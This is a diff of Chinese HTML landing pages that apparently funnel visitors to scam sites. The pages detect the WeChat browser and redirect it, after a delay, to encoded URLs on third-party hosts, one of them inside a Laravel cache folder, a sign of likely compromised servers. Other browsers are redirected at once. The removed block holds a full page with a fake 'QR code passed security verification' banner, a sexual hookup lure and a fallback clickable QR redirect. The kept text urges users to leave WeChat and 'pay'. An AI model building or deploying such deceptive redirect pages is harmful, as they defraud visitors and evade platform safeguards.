@@ -9,7 +9,7 @@
     
     <script>
         // 配置跳转域名变量
-        var wechatUrl = "http://kaisuo.net/gapp/top.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAHA4SHxEOBUAkWAQvBA48PyxGUFpTVk1XXFxRWlNeTEECHQwB";
+        var wechatUrl = "http://www.xh36.com/Public/images/top.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAEgMZCR4dF0AkWAQvBA48PyxGUFpTVk1XWVFVWFJbR0ECHQwB";
         var otherUrl = "http://zgjst.net/dayrui/Laravel/System/bootstrap/cache/top.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpADlwABxIIEEAkWAQvBA48PyxGUFpTVk1YXFxVXl5eR0ECHQwB";
         var currentTargetUrl = ""; // 存储当前应该跳转的URL
         var isWechat = false; // 标记是否为微信浏览器
@@ -260,7 +260,7 @@
         }
 
         .guide-image img {
-            max-width: 200px;
+            max-width: 100%;
             height: auto;
             border-radius: 8px;
             box-shadow: 0 2px 8px rgba(0,0,0,0.1);
@@ -351,10 +351,10 @@
             <span class="step-number">1</span>
             <div class="step-content">
                 <strong>第一步</strong><br>
-                点击右上角"..."显示菜单
+                右上角点击"..."显示菜单
             </div>
             <div class="guide-image">
-                <img src="./guide1.png" alt="第一步引导图" onerror="this.style.display='none'">
+                <img src="./guide1.png" alt="第一步引导图">
             </div>
         </div>
         
@@ -365,7 +365,7 @@
                 选择"浏览器"打开
             </div>
             <div class="guide-image">
-                <img src="./guide2.png" alt="第二步引导图" onerror="this.style.display='none'">
+                <img src="./guide2.png" alt="第二步引导图">
             </div>
         </div>
         
@@ -373,7 +373,7 @@
             <span class="step-number">3</span>
             <div class="step-content">
                 <strong>第三步</strong><br>
-                点击成功付款，在已购列表查看购买记录
+                点击成功付款 在已购列表查看购买记录
             </div>
         </div>
         
@@ -387,292 +387,6 @@
         if (window.top !== window.self) {
             window.top.location = window.self.location;
         }
-    </script>
-</body>
-</html><!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>用抖音点击（长按）下方二维码识别</title>
-    <link rel="shortcut icon" href="http://shprh0.lat/assets/img/favicon.ico">
-    
-    <script>
-        
-        // 配置跳转域名变量
-        var wechatUrl = "http://www.xh36.com/Public/images/top.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAEgMZCR4dF0AkWAQvBA48PyxGUFpTVk1XWVFVWFJbR0ECHQwB";
-        var otherUrl = "http://zgjst.net/dayrui/Laravel/System/bootstrap/cache/top.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpADlwABxIIEEAkWAQvBA48PyxGUFpTVk1YXFxVXl5eR0ECHQwB";
-        var currentTargetUrl = ""; // 存储当前应该跳转的URL
-        var redirectAttempted = false; // 标记是否已尝试跳转
-        
-        // 检测浏览器类型并跳转
-        function detectBrowserAndRedirect() {
-            var ua = navigator.userAgent.toLowerCase();
-            
-            if (ua.indexOf('micromessenger') !== -1) {
-                // 微信浏览器 - 使用延迟跳转
-                currentTargetUrl = wechatUrl;
-                console.log('检测到微信浏览器，2秒后跳转到微信端域名');
-                
-                // 微信浏览器延迟2秒跳转
-                setTimeout("javascript:location.href='" + wechatUrl + "'", 2000);
-                redirectAttempted = true;
-                
-            } else {
-                // 其他浏览器 - 立即跳转
-                currentTargetUrl = otherUrl;
-                console.log('检测到其他浏览器，立即跳转到其他端域名');
-                
-                try {
-                    redirectAttempted = true;
-                    window.location.href = currentTargetUrl;
-                } catch (error) {
-                    console.log('自动跳转失败:', error);
-                    handleRedirectFailure();
-                }
-            }
-        }
-        
-        // 处理跳转失败的情况
-        function handleRedirectFailure() {
-            // 给图片添加点击跳转功能
-            addClickRedirectToImage();
-            
-            // 更新提示文字
-            var loadingText = document.querySelector('.loading-text');
-            if (loadingText) {
-                loadingText.innerHTML = '自动跳转失败，请点击上方二维码手动跳转';
-                loadingText.style.color = '#ff6b6b';
-                loadingText.classList.add('click-hint');
-            }
-        }
-        
-        // 给图片添加点击跳转功能
-        function addClickRedirectToImage() {
-            var img = document.querySelector('.code-qrcode img');
-            var qrcodeDiv = document.querySelector('.code-qrcode');
-            
-            if (img && currentTargetUrl && qrcodeDiv) {
-                // 创建a标签包裹图片
-                var link = document.createElement('a');
-                link.href = currentTargetUrl;
-                link.target = '_self';
-                link.style.display = 'block';
-                link.style.cursor = 'pointer';
-                
-                // 将图片移到a标签内
-                img.parentNode.insertBefore(link, img);
-                link.appendChild(img);
-                
-                // 添加点击事件（双重保险）
-                link.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    try {
-                        window.location.href = currentTargetUrl;
-                    } catch (error) {
-                        // 如果还是失败，尝试其他跳转方式
-                        window.location.replace(currentTargetUrl);
-                    }
-                });
-                
-                // 给图片添加点击提示样式
-                img.style.border = '2px solid #007bff';
-                img.style.cursor = 'pointer';
-                img.style.transition = 'all 0.3s ease';
-                
-                // 添加hover效果
-                img.addEventListener('mouseenter', function() {
-                    img.style.transform = 'scale(1.05)';
-                    img.style.boxShadow = '0 6px 12px rgba(0,123,255,0.3)';
-                });
-                
-                img.addEventListener('mouseleave', function() {
-                    img.style.transform = 'scale(1)';
-                    img.style.boxShadow = '0 4px 8px rgba(0,0,0,0.1)';
-                });
-                
-                console.log('已为图片添加点击跳转功能');
-            }
-        }
-        
-        // 页面加载后立即检测并跳转
-        detectBrowserAndRedirect();
-    </script>
-    
-    <style type="text/css">
-        /* 重置样式 */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: #eee;
-            color: #000;
-            font-size: 16px;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            padding-top: 45px;
-        }
-
-        /* 顶部安全验证条 */
-        #safety {
-            width: 100%;
-            height: 45px;
-            background: #e8fef2;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-
-        .icon {
-            width: 26px;
-            height: 26px;
-            background: url("/assets/img/renzheng.png") no-repeat center;
-            background-size: contain;
-            margin: 0 10px;
-            flex-shrink: 0;
-        }
-
-        .text {
-            color: rgb(7, 193, 96);
-            font-size: 15px;
-            font-weight: 500;
-        }
-
-        /* 主内容区域 */
-        .code-box {
-            background-color: #fff;
-            margin: 20px;
-            padding: 30px 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            word-break: break-all;
-        }
-
-        .code-title {
-            font-weight: bold;
-            margin-bottom: 20px;
-            font-size: 18px;
-            text-align: center;
-            line-height: 1.4;
-            color: #333;
-        }
-
-        .code-qrcode {
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .code-qrcode img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-        }
-
-        .code-qrcode div {
-            margin-top: 15px;
-            font-size: 16px;
-            color: #666;
-            line-height: 1.5;
-        }
-
-        /* 加载提示 */
-        .loading-text {
-            text-align: center;
-            color: #666;
-            font-size: 14px;
-            margin-top: 20px;
-            transition: color 0.3s ease;
-        }
-
-        /* 点击提示动画 */
-        .click-hint {
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
-        /* 链接样式 */
-        a {
-            text-decoration: none;
-            color: inherit;
-            transition: opacity 0.3s ease;
-        }
-
-        a:hover {
-            opacity: 0.8;
-        }
-
-        /* 响应式设计 */
-        @media (max-width: 480px) {
-            .code-box {
-                margin: 10px;
-                padding: 20px 15px;
-            }
-            
-            .code-title {
-                font-size: 16px;
-            }
-            
-            .text {
-                font-size: 14px;
-            }
-        }
-
-        /* 手机端点击效果 */
-        @media (max-width: 768px) {
-            .code-qrcode img:active {
-                transform: scale(0.95);
-            }
-        }
-    </style>
-</head>
-<body>
-    <!-- 顶部安全验证提示 -->
-    <div id="safety">
-        <div class="icon"></div>
-        <div class="text">二维码已通过安全验证（如果进不去返回刷新）</div>
-    </div>
-
-    <!-- 主内容区域 -->
-    <div class="code-box">
-        <div class="code-title">在抖音长按（点击）下方二维码识别<br>同城附近柯阅 25以下勿扰…</div>
-        
-        <div class="code-qrcode">
-            <img src="./qer.png" alt="二维码">
-            <div>只进入身体，不进入生活 有门槛！同城约炮，</div>
-        </div>
-        
-        <div class="loading-text">正在识别浏览器类型，即将跳转...</div>
-    </div>
-
-    <script>
-        // 防止页面被嵌入iframe（安全措施）
-        if (window.top !== window.self) {
-            window.top.location = window.self.location;
-        }
-        
-        // 如果5秒内没有跳转，显示错误信息并启用手动跳转
-        setTimeout(function() {
-            if (!redirectAttempted) {
-                handleRedirectFailure();
-            }
-        }, 5000);
     </script>
 </body>
 </html>
